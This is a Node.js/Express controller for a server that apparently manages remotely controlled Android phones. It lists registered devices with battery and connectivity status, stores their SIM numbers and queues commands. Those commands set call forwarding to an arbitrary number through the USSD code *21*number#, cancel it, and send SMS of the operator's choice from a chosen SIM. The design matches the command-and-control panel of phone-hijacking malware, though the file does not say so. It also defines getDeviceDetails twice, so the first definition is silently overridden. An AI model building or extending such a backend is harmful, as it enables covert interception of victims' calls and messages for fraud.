const mongoose = require('mongoose');
const Device = require('../models/Device');
const Battery = require('../models/Battery');
const SimInfo = require('../models/SimInfo');
const Call = require('../models/Call');
const SMS = require('../models/SMS');

exports.addDeviceDetails = async (req, res) => {
    try {
        const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
        if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
            return res.status(400).json({ success: false, error: "All fields are required!" });
        }

        const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator });
        await newDevice.save();

        res.status(201).json({ success: true, message: "Device registered successfully!", uniqueid: newDevice._id });
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
};

exports.getAllDevicesData = async (req, res) => {
    try {
        const devices = await Device.find({}, 'brand _id');
        const batteryStatuses = await Battery.find({}, 'uniqueid batteryLevel connectivity');

        const devicesWithBattery = devices.map(device => {
            const battery = batteryStatuses.find(b => 
                b.uniqueid && b.uniqueid.toString() === device._id.toString()
            );

            return {
                _id: device._id,
                brand: device.brand,
                uniqueid: device._id,
                batteryLevel: battery ? battery.batteryLevel : 'N/A',
                connectivity: battery ? battery.connectivity : false
            };
        });

        // Send the data as a JSON response
        res.json({ success: true, phoneData: devicesWithBattery });

    } catch (err) {
        console.error("Error in getAllDevicesData:", err);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

exports.getDeviceDetails = async (req, res) => {
    try {
        const { id } = req.params;
        const deviceDetails = await Device.findById(id); // Changed 'device' to 'deviceDetails'
        
        if (!deviceDetails) {
            return res.status(404).json({ success: false, error: "Device not found" });
        }

        // Send the device details as a JSON response
        res.json({ success: true, Data: deviceDetails }); // Use 'deviceDetails' instead of 'device'

    } catch (err) {
        console.error("Error fetching device details:", err);
        res.status(500).json({ success: false, error: "Server Error" });
    }
};

exports.getDeviceDetails = async (req, res) => {
    try {
        const device_id = req.params.id;

        // Validate ObjectId
        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }

        // Fetch device details
        const device = await Device.findById(device_id);
        if (!device) {
            return res.status(404).json({ success: false, error: "Device not found" });
        }

        // Fetch SIM details from SimInfo collection
        const simInfo = await SimInfo.findOne({ uniqueid: device_id });

        // Check if simInfo exists and has properties
        const sim1Number = simInfo?.sim1Number || "N/A";
        const sim2Number = simInfo?.sim2Number || "N/A";

        // Return JSON response for Android app
        return res.json({
            success: true,
            device,
            sim1Number,
            sim2Number
        });

    } catch (err) {
        console.error("Error fetching device details:", err);
        return res.status(500).json({ success: false, error: "Server Error" });
    }
};


exports.stopCallForwarding = async (req, res) => {
    try {
        const device_id = req.params.id;
        const { sim } = req.body; // Expecting "SIM 1" or "SIM 2"

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        const updatedCall = await Call.findOneAndUpdate(
            { call_id: device_id },
            { 
                sim: sim, 
                code: "##21#",  // Stop forwarding
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log("Stop Call Forwarding updated document:", updatedCall);
        return res.json({
            success: true,
            message: "Call forwarding stopped successfully",
            updatedCall
        });
    } catch (error) {
        console.error("Error in stopCallForwarding:", error);
        return res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

exports.setCallForwarding = async (req, res) => {
    try {
        const { phoneNumber, sim } = req.body; // Expecting "SIM 1" or "SIM 2"
        const device_id = req.params.id;

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!/^\d{10}$/.test(phoneNumber)) {
            return res.status(400).json({ success: false, error: "Invalid phone number format" });
        }
        if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        const activationCode = `*21*${phoneNumber}#`;

        const updatedCall = await Call.findOneAndUpdate(
            { call_id: device_id },
            { 
                sim: sim,
                code: activationCode,
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log("Set Call Forwarding updated document:", updatedCall);
        return res.json({
            success: true,
            message: "Call forwarding set successfully",
            updatedCall
        });
    } catch (error) {
        console.error("Error in setCallForwarding:", error);
        return res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Get Call Forwarding Status
exports.getCallForwardingStatus = async (req, res) => {
    try {
        const device_id = req.params.id;
        let simParam = req.query.sim; // Expecting "SIM 1" or "SIM 2"

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, message: "Invalid Device ID", code: null });
        }
        if (simParam && !["SIM 1", "SIM 2"].includes(simParam)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        let query = { call_id: device_id };
        
        if (simParam) {
            query.sim = simParam;
        }

        const callData = await Call.findOne(query).select("code sim");
        if (!callData) {
            return res.status(404).json({ success: false, message: "No call forwarding set for this device", code: null });
        }

        res.status(200).json({
            success: true,
            message: "Call forwarding details fetched successfully",
            code: callData.code,
            sim: callData.sim
        });
    } catch (error) {
        console.error("Error fetching call forwarding status:", error);
        res.status(500).json({ success: false, message: "Internal Server Error", code: null });
    }
};

// 7) Send an SMS (upsert into the SMS collection)
exports.sendSMS = async (req, res) => {
    try {
        const { address, message, sim } = req.body;
        const deviceId = req.params.id ? req.params.id.trim() : null;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: "Device ID is missing in URL" });
        }
        if (!address || !message || !sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid data" });
        }

        const smsData = await SMS.findOneAndUpdate(
            { deviceId: deviceId },
            {
                deviceId: deviceId,
                address,
                message,
                sim,
                status: "Sent",
                updatedAt: new Date()
            },
            { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        return res.json({
            success: true,
            message: "SMS sent successfully!",
            data: smsData
        });
    } catch (error) {
        console.error("Error sending SMS:", error);
        return res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};
exports.getSmsByDeviceId = async (req, res) => {
    try {
        // Trim the deviceId to remove extra spaces
        const deviceId = req.params.id ? req.params.id.trim() : null;
        if (!deviceId) {
            return res.status(400).json({ 
                success: false, 
                message: "Device ID missing", 
                data: null 
            });
        }

        // Query by deviceId (ensure your schema has deviceId defined as a String)
        const smsData = await SMS.findOne({ deviceId: deviceId });
        if (!smsData) {
            return res.status(404).json({ 
                success: false, 
                message: "No SMS found for this device", 
                data: null 
            });
        }

        return res.status(200).json({
            success: true,
            message: "SMS retrieved successfully!",
            data: smsData
        });
    } catch (err) {
        console.error("Error in getSmsByDeviceId:", err);
        return res.status(500).json({ 
            success: false, 
            message: "Internal Server Error", 
            data: null 
        });
    }
};